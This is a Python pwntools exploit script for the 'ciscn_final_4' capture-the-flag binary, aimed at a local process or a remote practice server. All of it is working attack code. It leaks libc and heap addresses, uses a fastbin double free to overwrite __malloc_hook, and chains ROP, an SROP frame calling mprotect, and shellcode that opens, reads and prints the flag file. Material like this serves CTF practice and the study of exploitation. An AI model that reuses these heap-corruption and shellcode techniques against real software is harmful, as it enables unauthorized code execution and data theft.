import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./ciscn_final_4')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./ciscn_final_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',28270)
			elf=ELF('./ciscn_final_4')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

		def add(a,c):
			io.sendlineafter('>> ','1')
			io.sendlineafter('size?\n',str(a))
			io.sendafter('content?\n',c)

		def delete(a):
			io.sendlineafter('>> ','2')
			io.sendlineafter('index ?\n',str(a))


		def show(a):
			io.sendlineafter('>> ','3')
			io.sendlineafter('index ?\n',str(a))
		


		pop_rdi=0x0000000000401193
		pop_rsi_r15=0x0000000000401191
		pop_rsp=0x000000000040118d

		pay=p64(pop_rdi)
		pay+=p64(0)
		pay+=p64(pop_rsi_r15)
		pay+=p64(elf.bss()+0x200)+p64(0)
		pay+=p64(elf.plt['read'])
		pay+=p64(pop_rdi)
		pay+=p64(elf.bss()+0x200)
		pay+=p64(pop_rsp)
		pay+=p64(elf.bss()+0x2e0)


		io.recv()
		io.sendline(pay)
		add(0xf0,'aaa')
		add(0x68,'aaa')
		add(0x68,'aaa')
		delete(0)
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-88-0x10-libc.sym['__malloc_hook']
		libc.address=libc_base
		delete(1)
		delete(2)
		delete(1)
		show(1)
		heap_base=u64(io.recvuntil('\n')[:-1].ljust(8,'\x00'))-0x170
		add(0x68,p64(libc.sym['__malloc_hook']-0x23))
		add(0x68,p64(0))
		add(0x68,p64(0))
		add(0x68,'\x00'*0x13+p64(libc_base+0x00000000000c96a6))
		pop_rdi_ret_addr=pop_rdi
		pop_rdx_rsi_ret_addr=libc_base+0x00000000001150c9
		io.sendlineafter('>> ','1')
		# gdb.attach(io,'b malloc')
		# pause()
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%(elf.bss()+0x400)
		io.sendlineafter('size?\n',str(32))
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=elf.bss()+0x318
		srop_mprotect.rdi=elf.bss()&0xfffffffffffff000
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		pay=str(srop_mprotect).ljust(0xe0,'\x00')
		pay+=p64(libc.sym['setcontext']+53)*4
		pay+=p64(elf.bss()+0x320)
		pay+=asm(shell1)
		io.sendline(pay)
		shell2='''
		push 0
		mov  rax,0x67616c662f
		push rax
		mov  rsi,rsp
		mov  rdi,0x70
		xor  rdx,rdx
		mov  rax,0x101
		syscall

		mov  rdi,rax
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x0
		syscall

		mov  rdi,0x1
		mov  rsi,rsp
		mov  rdx,0x100
		mov  rax,0x1
		syscall
		'''
		io.sendline(asm(shell2))



		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue